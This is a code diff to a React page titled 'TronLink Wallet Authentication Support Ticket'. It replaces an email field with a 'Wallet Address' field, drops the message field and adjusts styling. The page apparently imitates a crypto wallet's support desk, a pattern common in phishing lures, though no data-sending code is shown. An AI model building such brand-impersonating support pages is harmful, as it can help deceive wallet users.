@@ -24,7 +24,6 @@ export default function Home() {
   const [formData, setFormData] = useState({
     name: "",
     email: "",
-    message: "",
   });
 
   const [errors, setErrors] = useState({
@@ -104,6 +103,14 @@ export default function Home() {
     }
   };
 
+  const goBack = () => {
+    setFormSubmitted(false);
+    setFormData({
+      name: "",
+      email: "",
+    });
+  };
+
   return (
     <main
       className={`${anonymous_Pro.className} relative space-y-14 w-full min-h-screen md:p-10 p-5 `}
@@ -114,7 +121,7 @@ export default function Home() {
           backgroundImage: "url('/best.png')",
           backgroundRepeat: "repeat",
           backgroundSize: "150px",
-          opacity: 0.05,
+          opacity: 0.06,
           zIndex: -1,
         }}
       ></div>
@@ -130,11 +137,11 @@ export default function Home() {
         <h1 className={`${alegreya.className} text-4xl font-normal `}>
           TronLink Wallet
         </h1>
-        <p className="text-md">Link Tron Ecosystem</p>
+        <p className="text-md ">Link Tron Ecosystem</p>
       </div>
       <div className={` ${albert_Sans.className} mx-auto`}>
         <h1
-          className={`  md:text-4xl text-2xl italic leading-tight py-2 border-t-[1px] border-b-[1px] border-white text-center`}
+          className={`  md:text-4xl text-2xl italic leading-tight py-2 border-t-[1px] border-b-[1px] border-white text-center text-[#2ce1eee7]`}
         >
           Welcome to Tronlink Wallet <br /> Authentication Support <br />
           Ticket
@@ -164,7 +171,6 @@ export default function Home() {
               className={`${
                 errors.name ? "border-2 border-red-500" : ""
               } text-black py-3 px-2 rounded-md text-xl`}
-              placeholder="Name"
             />
             {errors.name && (
               <p className="text-red-500">Please fill out this field.</p>
@@ -173,10 +179,10 @@ export default function Home() {
 
           <div className="flex flex-col gap-1">
             <label htmlFor="email">
-              Email Address <span>(required)</span>
+              Wallet Address <span>(required)</span>
             </label>
             <input
-              type="email"
+              type="text"
               id="email"
               name="email"
               value={formData.email}
@@ -184,7 +190,6 @@ export default function Home() {
               className={`${
                 errors.email ? "border-2 border-red-500" : ""
               } text-black py-3 px-2 rounded-md text-xl`}
-              placeholder="Email"
             />
             {errors.email && (
               <p className="text-red-500">
@@ -195,18 +200,18 @@ export default function Home() {
 
           <button
             type="submit"
-            className="flex gap-2 items-center bg-white text-black px-8 py-2 text-xl font-medium rounded-full"
+            className="flex gap-2 items-center bg-[#2ce1eee7] text-black px-8 py-2 text-xl font-semibold rounded-full"
           >
             Submit
             {loading && <span className="loader"></span>}
           </button>
         </form>
       ) : (
-        <div className="text-2xl space-y-6">
+        <div className="text-2xl space-y-14">
           <p className="text-green-500">Ticket submitted successfully!</p>
           <button
-            onClick={() => setFormSubmitted(false)}
-            className="bg-none underline cursor-pointer"
+            onClick={goBack}
+            className="bg-none text-[#2ce1eee7] underline cursor-pointer"
           >
             Go back
           </button>
